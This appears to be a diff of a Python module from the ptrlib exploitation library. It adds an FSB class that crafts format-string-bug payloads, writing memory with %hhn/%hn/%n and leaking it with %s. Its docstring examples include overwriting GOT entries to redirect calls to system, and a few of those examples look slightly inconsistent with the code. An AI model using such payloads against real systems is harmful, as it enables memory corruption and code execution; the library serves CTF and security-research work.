@@ -1,132 +1,210 @@
-from ptrlib.binary.encoding import *
-from ptrlib.binary.packing import *
+"""This package provides some utilities for format string bug.
+"""
 from logging import getLogger
+from typing import List, Literal, NamedTuple, Optional, Union
+from ptrlib.annotation import PtrlibBitsT, PtrlibEndiannessT
+from ptrlib.binary.encoding import str2bytes
+from ptrlib.binary.packing import u32, p32, p64, flat
 
 logger = getLogger(__name__)
 
-
-def fsb_read(pos, reads, written=0, bits=32):
-    # TODO: Not implemented
-    raise NotImplementedError()
-
-def _fsb_fmtstr(pos, table, bs, written, prefix):
-    payload = b''
-    for addr in table:
-        cnum = ((table[addr]-written-1) & ((1<<8*bs)-1)) + 1
-        fmtstr = "%{}c%{}${}".format(cnum, pos, prefix)
-        payload += str2bytes(fmtstr)
-        written += cnum
-        pos += 1
-    return payload
-
-def fsb64(pos, writes, bs=1, written=0, size=8, delta=0, endian='little'):
-    assert bs in [1, 2, 4]
-
-    prefix = {1:"hhn", 2:"hn", 4:"n"}[bs]
-
-    # create dict to hold where/what to write
-    table = {}
-    for addr in writes:
-        for i in range(8 // bs):
-            if size // bs <= i: continue
-            table[addr + i*bs] = (writes[addr]>>i*8*bs) & ((1<<8*bs)-1)
-
-    addrList = list(table.keys())
-    payload = b''
-
-    # speculate where the address list would come
-    speculated_pos = pos
-    while True:
-        fmtstr = _fsb_fmtstr(speculated_pos, table, bs, delta+written, prefix)
-        fmtstr += b'A' * (((speculated_pos-pos) * 8 - len(fmtstr)) % 8)
-        if speculated_pos >= pos + len(fmtstr) // 8:
-            break
-        else:
-            speculated_pos = pos + len(fmtstr) // 8
-
-    # create format string
-    payload += _fsb_fmtstr(speculated_pos, table, bs, delta+written, prefix)
-
-    # put padding
-    payload += b'A' * (((speculated_pos-pos) * 8 - len(payload)) % 8)
-
-    # create address list
-    payload += flat(addrList, map=lambda addr:p64(addr, endian))
-
-    return payload
-
-def fsb32(pos, writes, bs=1, written=0, size=4, rear=False, delta=0, endian='little'):
-    assert bs in [1, 2, 4]
-
-    prefix = {1:"hhn", 2:"hn", 4:"n"}[bs]
-
-    # create dict to hold where/what to write
-    table = {}
-    for addr in writes:
-        for i in range(4 // bs):
-            if size // bs <= i: continue
-            table[addr + i*bs] = (writes[addr]>>i*8*bs) & ((1<<8*bs)-1)
-
-    addrList = list(table.keys())
-
-    payload = b''
-    if rear: # put address list after format string
-        # speculate where the address list would come
-        speculated_pos = pos
-        while True:
-            fmtstr = _fsb_fmtstr(speculated_pos, table, bs, delta+written, prefix)
-            fmtstr += b'A' * (((speculated_pos-pos) * 4 - len(fmtstr)) % 4)
-            if speculated_pos >= pos + len(fmtstr) // 4:
-                break
-            else:
-                speculated_pos = pos + len(fmtstr) // 4
-
-        # create format string
-        payload += _fsb_fmtstr(speculated_pos, table, bs, delta+written, prefix)
-
-        # put padding
-        payload += b'A' * (((speculated_pos-pos) * 4 - len(payload)) % 4)
-
-        # create address list
-        payload += flat(addrList, map=lambda addr: p32(addr, endian))
-
-    else:    # put address list before format string
-        # create address list
-        payload += flat(addrList, map=lambda addr: p32(addr, endian))
-        if b'\0' in payload:
-            logger.error("'\\x00' found in address list. Set `rear=True` to put address list after format string.")
-
-        # create format string
-        payload += _fsb_fmtstr(pos, table, bs, delta+written+len(payload), prefix)
-
-    return payload
-
-def fsb(pos, writes, bs=1, written=0, bits=32, size=8, rear=None, delta=0, endian='little'):
-    """Craft a Format String Exploit payload
-    
-    Args:
-        pos (int)    : The position where your input appears on the stack
-        writes (list): A disctionary which has the addresses as keys and the data as values
-        bs (int)     : The bytes to write at once (must be 1, 2, 4)
-        written (int): The byte length to be written before this payload
-        bits (int)   : The address bits (32 or 64)
-        size (int)   : Bytes to write
-        rear (bool)  : Whether put address list after format string or before
-        endian (str) : Endian ('big' or 'little')
-        delta (int)  : Set this value when you somehow want to change the start number
-        null (bool)  : [no longer works, for compatibility]
-
-    Returns:
-        bytes: crafted payload
+class FSBOp(NamedTuple):
+    """Representation of a single FSB operation
     """
-    if bits == 32:
-        if rear is None:
-            rear = False
-        return fsb32(pos, writes, bs, written, size, rear, delta, endian)
-    
-    elif bits == 64:
-        assert rear is None or rear == True
-        return fsb64(pos, writes, bs, written, size, delta, endian)
-    
-    else:
-        raise ValueError("`bits` must be 32 or 64")
+    type: Literal['r', 'w', 'p']
+    address: int = 0
+    value: int = 0
+    size: int = 0
+    data: bytes = b''
+
+
+class FSB:
+    """Craft payload for FSB (format string bug).
+
+    Attributes:
+        position (int): The argument index where the payload is located.
+                        For example, if you feed "%p.%p.%p..." and get 0x70252e70252e7025
+                        (="%p.%p.%p") at 7th (1-indexed), the position should be 7.
+        written (int): The number of bytes already printed. This parameter is useful when
+                       your payload is appended to a constant string by `strcat`,
+                       or the address of the format string is not aligned.
+        payload (bytes): FSB payload.
+
+    Examples:
+        ```
+        fsb = FSB(position=10, bits=64)
+        fsb.write(0x404010, p64(), size=2)
+        fsb.write(0x404020, 0xff, size=1)
+        print(fsb.payload)
+
+        fsb.written = 3
+        fsb.rear = True # Default
+        print("ABC" + fsb.payload)
+        ```
+    """
+    WRITE_PREFIX = {1: 'hhn', 2: 'hn', 4: 'n'}
+
+    def __init__(self,
+                 position: int,
+                 bits: PtrlibBitsT = 64,
+                 byteorder: PtrlibEndiannessT = 'little',
+                 **kwargs: int):
+        assert position >= 1, "Position must be a positive integer."
+
+        self._ops: List[FSBOp] = []
+        self.position = position
+        self.written = kwargs.get('written', 0)
+        self._rear = bits == 64
+        self._bits = bits
+        self._byteorder = byteorder
+
+    @property
+    def rear(self) -> bool:
+        """Get rear flag.
+
+        If this flag is set to True, the format string precedes the address list.
+        """
+        return self._rear
+
+    @rear.setter
+    def rear(self, flag: bool):
+        if self._bits == 64 and not flag:
+            raise ValueError("Address list cannot precede format string in 64-bit")
+        self._rear = flag
+
+    def read(self, address: int, written: int=0):
+        """Read a NULL-terminated string.
+
+        Args:
+            address (int): The address of data to leak.
+            written (int): The expected number of bytes to be printed.
+                           You can skip this parameter if you're not using
+                           `write` after this `read`.
+        """
+        self._ops.append(FSBOp('r', address, 0, written))
+
+    def write(self, address: int, data: Union[str, bytes], block_size: Optional[int]=1):
+        """Write data at a specific address.
+
+        Args:
+            address (int): The address to store the value.
+            data (str or bytes): The data to write.
+            block_size (int, optional): The number of bytes to split data into.
+                                        Must be either 1 (%hhn), 2 (%hn), or 4 (%n).
+
+        Examples:
+            ```
+            fsb = FSB(position=10)
+            fsb.write(elf.got['atoi'], p64(elf.plt['system']), block_size=2)
+            sock.sendline(fsb.payload)
+            ```
+
+            ```
+            fsb = FSB(6)
+            fsb.print(b"AAA")
+            fsb.write(elf.got['exit'], p8(elf.symbol('_start') & 0xff))
+            fsb.read(elf.got['puts'])
+            sock.sendline(fsb.payload)
+            ```
+        """
+        assert block_size in [1, 2, 4], "`block_size` must be either 1, 2, or 4"
+
+        offset = 0
+        while offset < len(data):
+            value = u32(data[offset:offset+block_size], self._byteorder)
+            self._ops.append(FSBOp('w', address + offset, value, block_size))
+            offset += block_size
+
+    def print(self, data: Union[str, bytes]):
+        """Print data to the terminal.
+
+        Args:
+            data (str or bytes): The data to print.
+
+        Examples:
+            ```
+            fsb = FSB(6)
+            fsb.read(elf.got['atoi'])
+            fsb.print("XXX")
+            fsb.read(elf.got['system'])
+            fsb.print("XXX")
+            fsb.read(elf.got['abc'])
+            ```
+        """
+        data = str2bytes(data)
+        if b'\x00' in data:
+            raise ValueError("NULL bytes cannot be printed in a format string")
+
+        self._ops.append(FSBOp('p', data=data))
+
+    def _format_string(self, position: int, written: int) -> bytes:
+        """Craft a format string
+
+        Args:
+            position (int): The index of the payload in the stack.
+            written (int): The number of bytes already written.
+        """
+        payload = b''
+        for op in self._ops:
+            if op.type == 'w':
+                write_num = (op.value - written) % (1 << 8*op.size)
+                if write_num == 0:
+                    payload += f"%{position}${self.WRITE_PREFIX[op.size]}".encode()
+                elif write_num == 1:
+                    payload += f"%c%{position}${self.WRITE_PREFIX[op.size]}".encode()
+                else:
+                    payload += f"%{write_num}c%{position}${self.WRITE_PREFIX[op.size]}".encode()
+                written = (written + write_num) % 0x1_0000_0000
+                position += 1
+
+            elif op.type == 'r':
+                payload += f"%{position}$s".encode()
+                written = (written + op.size) % 0x1_0000_0000
+                position += 1
+
+            else:
+                payload += op.data
+                written += len(op.data)
+
+        return payload
+
+    @property
+    def payload(self) -> bytes:
+        """Craft FSB payload.
+        """
+        payload = b''
+        if self._bits == 32:
+            bytesize, packer = 4, p32
+        else:
+            bytesize, packer = 8, p64
+
+        if not self._rear:
+            # Front mode
+            payload += flat([op.address for op in self._ops if op.type != 'p'],
+                            map=lambda addr: packer(addr, self._byteorder))
+
+            if b'\0' in payload:
+                logger.warning("'\\x00' found in the address list. Using rear mode as a fallback.")
+            else:
+                payload += self._format_string(self.position, self.written + len(payload))
+                return payload
+
+        # Guess the position of the address list
+        guess_position = self.position
+        while True:
+            delta = guess_position - self.position
+            fmtstr = self._format_string(guess_position, self.written)
+            fmtstr += b'A' * ((delta * bytesize - len(fmtstr)) % bytesize)
+            if guess_position >= self.position + len(fmtstr) // bytesize:
+                break
+            guess_position = self.position + len(fmtstr) // bytesize
+
+        # Craft a format string
+        delta = guess_position - self.position
+        payload += self._format_string(guess_position, self.written)
+        payload += b'A' * ((delta * bytesize - len(payload)) % bytesize)
+        payload += flat([op.address for op in self._ops if op.type != 'p'],
+                        map=lambda addr: packer(addr, self._byteorder))
+        return payload
+
+__all__ = ['FSB']
